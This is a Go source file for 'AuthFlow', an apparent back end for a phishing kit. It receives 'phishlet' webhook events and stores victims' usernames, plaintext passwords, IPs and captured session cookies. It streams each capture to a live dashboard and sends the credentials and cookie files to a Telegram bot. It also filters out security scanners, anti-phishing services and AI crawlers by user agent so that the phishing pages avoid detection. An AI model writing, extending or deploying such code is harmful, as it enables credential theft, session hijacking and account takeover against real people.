package main

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
)

type Config struct {
	Domain           string   `json:"domain"`
	VpsIp            string   `json:"vps_ip"`
	TelegramBotToken string   `json:"telegram_bot_token"`
	TelegramChatId   string   `json:"telegram_chat_id"`
	AdminPass        string   `json:"admin_pass"`
	DataDir          string   `json:"data_dir"`
	SubPortal1       string   `json:"sub_portal1"`
	AdminPath        string   `json:"admin_path"`
	SubPortal2       string   `json:"sub_portal2"`
	SubPortal3       string   `json:"sub_portal3"`
	LogRetentionDays int      `json:"log_retention_days"`
	WebhookSecret    string   `json:"webhook_secret"`
	AdminWhitelist   []string `json:"admin_whitelist"`
}

var (
	config       Config
	db           *sql.DB
	configPath   string
	startTime    time.Time
	upgrader     = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	wsClients    = make(map[*websocket.Conn]bool)
	wsMutex      sync.RWMutex
)

var botPatterns = []string{
	"googlebot", "bingbot", "yandexbot", "duckduckbot", "slurp", "baiduspider",
	"facebot", "twitterbot", "linkedinbot", "whatsapp", "discordbot", "slackbot",
	"telegrambot", "applebot", "virustotal", "urlscan", "phishtank", "netcraft",
	"bitdefender", "crawler", "spider", "scanner", "curl", "wget",
	"python-requests", "go-http-client", "node-fetch", "axios", "okhttp",
	"headless", "phantom", "puppeteer", "playwright", "chatgpt", "claude",
	"censys", "shodan", "zgrab", "nmap", "masscan", "nikto", "nessus", "hydra",
}

func main() {
	startTime = time.Now()
	flag.StringVar(&configPath, "config", "/opt/authflow/config.json", "config file path")
	port := flag.Int("port", 3000, "server port")
	flag.Parse()

	loadConfig()
	os.MkdirAll(config.DataDir, 0700)
	initDB()
	defer db.Close()

	go runCleanupTicker()

	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(gin.Recovery())
	r.SetTrustedProxies([]string{"127.0.0.1", "::1"})

	r.GET("/ws", websocketHandler)
	r.GET("/_health", healthCheck)
	r.POST("/api/webhook", webhookHandler)

	admin := r.Group("/" + config.AdminPath)
	admin.Use(adminAuth())
	{
		admin.GET("/", dashboardHandler)
		admin.GET("/data", dashboardDataHandler)
		admin.GET("/sessions", sessionsHandler)
		admin.GET("/visits", visitsHandler)
		admin.GET("/logs", logsHandler)
		admin.POST("/restart", restartHandler)
		admin.POST("/cleanup", cleanupHandler)
		admin.GET("/download/:id", downloadHandler)
	}

	log.Printf("Server started on port %d", *port)
	log.Printf("Dashboard: http://localhost:%d/%s", *port, config.AdminPath)
	r.Run(fmt.Sprintf("0.0.0.0:%d", *port))
}

func loadConfig() {
	data, err := os.ReadFile(configPath)
	if err != nil {
		log.Fatalf("Config error: %v", err)
	}
	if err := json.Unmarshal(data, &config); err != nil {
		log.Fatalf("Parse error: %v", err)
	}
}

func initDB() {
	dbPath := filepath.Join(config.DataDir, "authflow.db")
	var err error
	db, err = sql.Open("sqlite3", dbPath+"?_journal=WAL&_sync=NORMAL")
	if err != nil {
		log.Fatalf("DB error: %v", err)
	}

	db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY, site TEXT, username TEXT, password TEXT,
		ip TEXT, ua TEXT, is_bot INTEGER, step1 TEXT, step2 TEXT,
		cookies TEXT, completed INTEGER, created TEXT
	)`)
	db.Exec(`CREATE TABLE IF NOT EXISTS visits (
		id INTEGER PRIMARY KEY AUTOINCREMENT, site TEXT, ip TEXT,
		ua TEXT, is_bot INTEGER, bot TEXT, ref TEXT, created TEXT
	)`)
}

func getClientIP(c *gin.Context) string {
	if cf := c.GetHeader("CF-Connecting-IP"); cf != "" {
		return cf
	}
	if xff := c.GetHeader("X-Forwarded-For"); xff != "" {
		return strings.Split(xff, ",")[0]
	}
	ip := c.ClientIP()
	if idx := strings.Index(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func isBot(ua string) (bool, string) {
	if ua == "" {
		return true, "Empty UA"
	}
	lower := strings.ToLower(ua)
	for _, b := range botPatterns {
		if strings.Contains(lower, b) {
			return true, b
		}
	}
	if len(ua) < 30 && !strings.Contains(lower, "mozilla") {
		return true, "Short UA"
	}
	return false, ""
}

func adminAuth() gin.HandlerFunc {
	return func(c *gin.Context) {
		auth := c.GetHeader("Authorization")
		if !strings.HasPrefix(auth, "Basic ") {
			c.Header("WWW-Authenticate", `Basic realm="AuthFlow"`)
			c.JSON(401, gin.H{"error": "Auth required"})
			c.Abort()
			return
		}
		payload, _ := base64.StdEncoding.DecodeString(auth[6:])
		parts := strings.SplitN(string(payload), ":", 2)
		if len(parts) != 2 || parts[0] != "admin" || parts[1] != config.AdminPass {
			c.JSON(403, gin.H{"error": "Invalid credentials"})
			c.Abort()
			return
		}
		c.Next()
	}
}

func websocketHandler(c *gin.Context) {
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Printf("WebSocket error: %v", err)
		return
	}
	wsMutex.Lock()
	wsClients[conn] = true
	wsMutex.Unlock()
}

func broadcastEvent(event map[string]interface{}) {
	wsMutex.RLock()
	defer wsMutex.RUnlock()
	data, _ := json.Marshal(event)
	for client := range wsClients {
		if err := client.WriteMessage(websocket.TextMessage, data); err != nil {
			client.Close()
			delete(wsClients, client)
		}
	}
}

func webhookHandler(c *gin.Context) {
	secret := c.GetHeader("X-AuthFlow-Secret")
	if config.WebhookSecret != "" && secret != config.WebhookSecret {
		c.JSON(403, gin.H{"error": "Invalid secret"})
		return
	}

	var body map[string]interface{}
	c.ShouldBindJSON(&body)

	event, _ := body["event"].(string)
	phishlet, _ := body["phishlet"].(string)
	username, _ := body["username"].(string)
	ip := getClientIP(c)
	if ra, ok := body["remote_addr"].(string); ok && ra != "" {
		ip = ra
	}

	switch event {
	case "credentials":
		password, _ := body["password"].(string)
		id := uuid.New().String()
		ua, _ := body["user_agent"].(string)

		db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, step1, completed, created) 
			VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?)`,
			id, phishlet, username, password, ip, ua, time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))

		broadcastEvent(map[string]interface{}{
			"type": "credential", "site": phishlet, "username": username,
			"password": password, "ip": ip, "timestamp": time.Now().Format("15:04:05"),
		})

		msg := fmt.Sprintf("<b>New Credentials</b>\n\n<b>Service:</b> %s\n<b>Email:</b> %s\n<b>Password:</b> %s\n<b>IP:</b> %s",
			strings.ToUpper(phishlet), username, password, ip)
		go sendTelegram(msg)
		c.JSON(200, gin.H{"success": true, "id": id})

	case "session":
		cookies, _ := body["cookie_str"].(string)
		var id string
		db.QueryRow(`SELECT id FROM sessions WHERE username = ? AND site = ? AND completed = 0 ORDER BY created DESC LIMIT 1`,
			username, phishlet).Scan(&id)
		if id != "" {
			db.Exec(`UPDATE sessions SET cookies = ?, step2 = ?, completed = 1 WHERE id = ?`,
				cookies, time.Now().Format(time.RFC3339), id)
			broadcastEvent(map[string]interface{}{
				"type": "session", "site": phishlet, "username": username,
				"ip": ip, "timestamp": time.Now().Format("15:04:05"),
			})
			go sendTelegramFile(fmt.Sprintf("%s_%s_session.txt", phishlet, username), cookies, username)
			go sendTelegram(fmt.Sprintf("<b>Session Captured</b>\n\n<b>User:</b> %s\n<b>Service:</b> %s", username, strings.ToUpper(phishlet)))
		}
		c.JSON(200, gin.H{"success": true})

	default:
		c.JSON(200, gin.H{"success": true})
	}
}

func healthCheck(c *gin.Context) {
	c.JSON(200, gin.H{"status": "ok", "database": "connected", "uptime": time.Since(startTime).Seconds()})
}

func dashboardHandler(c *gin.Context) {
	c.Header("Content-Type", "text/html; charset=utf-8")
	tmpl, _ := template.New("dashboard").Parse(dashboardHTML)
	tmpl.Execute(c.Writer, gin.H{"domain": config.Domain, "version": "2.0.0", "goVersion": runtime.Version(), "adminPath": config.AdminPath})
}

func dashboardDataHandler(c *gin.Context) {
	var totalSessions, totalVisits, totalCompleted int
	db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&totalSessions)
	db.QueryRow("SELECT COUNT(*) FROM visits").Scan(&totalVisits)
	db.QueryRow("SELECT COUNT(*) FROM sessions WHERE completed = 1").Scan(&totalCompleted)

	rows, _ := db.Query(`SELECT created, site, username, password, ip, completed FROM sessions ORDER BY created DESC LIMIT 20`)
	var recent []map[string]interface{}
	for rows.Next() {
		var created, site, user, pass, ip string
		var completed int
		rows.Scan(&created, &site, &user, &pass, &ip, &completed)
		recent = append(recent, map[string]interface{}{
			"time": created, "site": site, "username": user, "password": pass, "ip": ip, "completed": completed == 1,
		})
	}
	c.JSON(200, gin.H{
		"stats": gin.H{"sessions": totalSessions, "visits": totalVisits, "completed": totalCompleted},
		"recent": recent, "server": gin.H{"uptime": time.Since(startTime).Seconds()},
		"portals": gin.H{"portal1": config.SubPortal1 + "." + config.Domain, "portal2": config.SubPortal2 + "." + config.Domain, "portal3": config.SubPortal3 + "." + config.Domain},
	})
}

func sessionsHandler(c *gin.Context) {
	rows, _ := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 100`)
	defer rows.Close()
	var sessions []map[string]interface{}
	for rows.Next() {
		var id, site, user, pass, ip, created string
		var completed int
		rows.Scan(&id, &site, &user, &pass, &ip, &completed, &created)
		sessions = append(sessions, map[string]interface{}{"id": id[:8], "site": site, "username": user, "password": pass, "ip": ip, "completed": completed == 1, "time": created})
	}
	c.JSON(200, sessions)
}

func visitsHandler(c *gin.Context) {
	rows, _ := db.Query(`SELECT created, site, ip, is_bot, bot, ref FROM visits ORDER BY created DESC LIMIT 100`)
	defer rows.Close()
	var visits []map[string]interface{}
	for rows.Next() {
		var created, site, ip, bot, ref string
		var isBot int
		rows.Scan(&created, &site, &ip, &isBot, &bot, &ref)
		visits = append(visits, map[string]interface{}{"time": created, "site": site, "ip": ip, "is_bot": isBot == 1, "bot": bot, "ref": ref})
	}
	c.JSON(200, visits)
}

func logsHandler(c *gin.Context) {
	lines := c.DefaultQuery("lines", "100")
	cmd := exec.Command("tail", "-n", lines, "/opt/authflow/logs/authflow.log")
	output, _ := cmd.Output()
	c.String(200, string(output))
}

func restartHandler(c *gin.Context) {
	go func() { time.Sleep(1 * time.Second); exec.Command("systemctl", "restart", "authflow").Run() }()
	c.JSON(200, gin.H{"success": true, "message": "Restarting..."})
}

func cleanupHandler(c *gin.Context) {
	retention := config.LogRetentionDays
	if retention <= 0 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
	db.Exec("DELETE FROM sessions WHERE created < ?", cutoff)
	db.Exec("DELETE FROM visits WHERE created < ?", cutoff)
	db.Exec("VACUUM")
	c.JSON(200, gin.H{"success": true})
}

func downloadHandler(c *gin.Context) {
	id := c.Param("id")
	var cookies string
	db.QueryRow("SELECT cookies FROM sessions WHERE id LIKE ?", id+"%").Scan(&cookies)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=session_%s.txt", id))
	c.String(200, cookies)
}

func sendTelegram(msg string) {
	if config.TelegramBotToken == "" {
		return
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", config.TelegramBotToken)
	data, _ := json.Marshal(map[string]string{"chat_id": config.TelegramChatId, "text": msg, "parse_mode": "HTML"})
	http.Post(url, "application/json", bytes.NewBuffer(data))
}

func sendTelegramFile(name, content, caption string) {
	if config.TelegramBotToken == "" {
		return
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", config.TelegramBotToken)
	body := &bytes.Buffer{}
	w := multipart.NewWriter(body)
	part, _ := w.CreateFormFile("document", name)
	part.Write([]byte(content))
	w.WriteField("chat_id", config.TelegramChatId)
	w.WriteField("caption", caption)
	w.Close()
	http.Post(url, w.FormDataContentType(), body)
}

func runCleanupTicker() {
	ticker := time.NewTicker(24 * time.Hour)
	for range ticker.C {
		retention := config.LogRetentionDays
		if retention <= 0 {
			retention = 30
		}
		cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
		db.Exec("DELETE FROM sessions WHERE created < ?", cutoff)
		db.Exec("DELETE FROM visits WHERE created < ?", cutoff)
		db.Exec("VACUUM")
	}
}

const dashboardHTML = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Dashboard</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Consolas',monospace;background:#0a0e27;color:#e0e0e0;overflow:hidden}.header{background:linear-gradient(135deg,#0f1535,#0a0e27);padding:12px 20px;border-bottom:1px solid #1e2a4a;display:flex;justify-content:space-between}.logo h1{font-size:18px;color:#00d4ff}.stats{display:flex;gap:15px}.stat-badge{background:#1a1f3e;padding:5px 15px;border-radius:20px;border-left:3px solid #00d4ff}.stat-badge .label{font-size:10px;color:#8a9dc0}.stat-badge .value{font-size:18px;font-weight:bold}.main{display:flex;height:calc(100vh - 55px)}.terminal{flex:2;background:#0a0e27;border-right:1px solid #1e2a4a;display:flex;flex-direction:column}.terminal-header{background:#0d1130;padding:10px 15px;border-bottom:1px solid #1e2a4a;font-size:12px;color:#00d4ff}.terminal-content{flex:1;overflow-y:auto;padding:10px;font-size:11px}.log-line{padding:4px 8px;border-bottom:1px solid #1a1f3e}.log-line.credential{background:rgba(52,211,153,0.1);border-left:3px solid #34d399}.log-line.session{background:rgba(96,165,250,0.1);border-left:3px solid #60a5fa}.timestamp{color:#8a9dc0;margin-right:10px}.stats-panel{flex:1;background:#0d1130;display:flex;flex-direction:column;padding:15px}.stats-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:20px}.stat-card{background:#1a1f3e;padding:12px;border-radius:8px;text-align:center}.stat-card h4{font-size:11px;color:#8a9dc0}.stat-card .number{font-size:24px;font-weight:bold;color:#00d4ff}.data-section{flex:1;overflow-y:auto}.data-section h3{font-size:12px;margin-bottom:10px;color:#00d4ff}.data-table{width:100%;border-collapse:collapse;font-size:11px}.data-table th{text-align:left;padding:8px;background:#1a1f3e;color:#8a9dc0}.data-table td{padding:6px 8px;border-bottom:1px solid #1e2a4a}.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:9px}.badge-human{background:#10b981}.badge-bot{background:#ef4444}.badge-portal1{background:#8b5cf6}.badge-portal2{background:#06b6d4}.badge-portal3{background:#f59e0b}</style></head>
<body><div class="header"><div class="logo"><h1>AuthFlow Monitor</h1></div><div class="stats"><div class="stat-badge"><div class="label">Sessions</div><div class="value" id="statSessions">0</div></div><div class="stat-badge"><div class="label">Completed</div><div class="value" id="statCompleted">0</div></div><div class="stat-badge"><div class="label">Visits</div><div class="value" id="statVisits">0</div></div></div></div><div class="main"><div class="terminal"><div class="terminal-header">Event Log</div><div class="terminal-content" id="logContainer"><div class="log-line"><span class="timestamp">[--:--:--]</span> Waiting for events...</div></div></div><div class="stats-panel"><div class="stats-grid"><div class="stat-card"><h4>Total Sessions</h4><div class="number" id="totalSessions">-</div></div><div class="stat-card"><h4>Session Cookies</h4><div class="number" id="totalCompleted">-</div></div><div class="stat-card"><h4>Total Visits</h4><div class="number" id="totalVisits">-</div></div><div class="stat-card"><h4>Uptime</h4><div class="number" id="uptime">-</div></div></div><div class="data-section"><h3>Recent Captures</h3><table class="data-table" id="recentTable"><thead><tr><th>Time</th><th>Site</th><th>Username</th><th>Password</th><th>Status</th></tr></thead><tbody><td><td colspan="5">Loading...<\/td><\/tr><\/tbody><\/table><\/div><\/div><\/div><script>let ws;function addLog(msg,type){const c=document.getElementById('logContainer');const t=new Date().toLocaleTimeString();const d=document.createElement('div');d.className='log-line '+type;d.innerHTML='<span class=\"timestamp\">['+t+']</span> '+msg;c.appendChild(d);d.scrollIntoView();if(c.children.length>200)c.removeChild(c.children[0]);}function connect(){const p=location.protocol==='https:'?'wss:':'ws:';ws=new WebSocket(p+'//'+location.host+'/ws');ws.onopen=()=>addLog('Connected to event stream','credential');ws.onmessage=e=>{const d=JSON.parse(e.data);if(d.type==='credential'){addLog('Credentials | '+d.site+' | '+d.username+' : '+d.password+' | IP: '+d.ip,'credential');loadData();}else if(d.type==='session'){addLog('Session | '+d.site+' | '+d.username+' | Cookies captured','session');loadData();}};ws.onerror=()=>{addLog('Connection error, reconnecting...','');setTimeout(connect,3000);};ws.onclose=()=>{addLog('Disconnected, reconnecting...','');setTimeout(connect,3000);};}async function loadData(){try{const r=await fetch(location.pathname+'/data');const d=await r.json();document.getElementById('totalSessions').textContent=d.stats.sessions;document.getElementById('totalCompleted').textContent=d.stats.completed;document.getElementById('totalVisits').textContent=d.stats.visits;document.getElementById('statSessions').textContent=d.stats.sessions;document.getElementById('statCompleted').textContent=d.stats.completed;document.getElementById('statVisits').textContent=d.stats.visits;const u=Math.floor(d.server.uptime),h=Math.floor(u/3600),m=Math.floor((u%3600)/60);document.getElementById('uptime').textContent=h+'h '+m+'m';const html=d.recent.map(s=>'<tr><td>'+s.time.substring(11,19)+'</td><td><span class=\"badge badge-portal'+(s.site==='portal1'?'1':(s.site==='portal2'?'2':'3'))+'\">'+s.site+'</span></td><td>'+escapeHtml(s.username)+'</td><td>'+escapeHtml(s.password)+'</td><td>'+(s.completed?'Session':'Credentials')+'</td></tr>').join('');document.querySelector('#recentTable tbody').innerHTML=html||'<tr><td colspan=\"5\">No captures<\/td><\/tr>';}catch(e){}}function escapeHtml(s){if(!s)return '';return s.replace(/[&<>]/g,function(m){if(m==='&')return'&amp;';if(m==='<')return'&lt;';if(m==='>')return'&gt;';return m;});}connect();loadData();setInterval(loadData,5000);<\/script><\/body><\/html>`